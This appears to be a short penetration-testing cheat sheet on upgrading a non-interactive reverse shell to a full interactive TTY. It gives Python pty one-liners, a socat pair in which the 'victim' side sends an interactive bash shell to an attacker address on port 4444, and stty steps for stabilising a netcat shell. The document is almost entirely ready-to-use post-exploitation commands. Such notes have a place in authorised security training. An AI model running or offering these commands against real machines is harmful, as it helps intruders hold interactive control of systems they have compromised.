# upgrading non-interactive shell

**Method 1: python pty module**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# or you can use python3 
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

* * * 

**Method 2: Using socat**

On Kali 

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On Victim

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

**Method 3: Upgrading from netcat with magic**

1. follow the same technique as in Method 1 and use Python to spawn a PTY. Once bash is running in the PTY, background the shell with `Ctrl-Z`

2. ```
# In Kali
$ stty raw -echo
$ fg
```

3. ```
# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=output from echo $TERM
$ stty rows <num> columns <cols>
```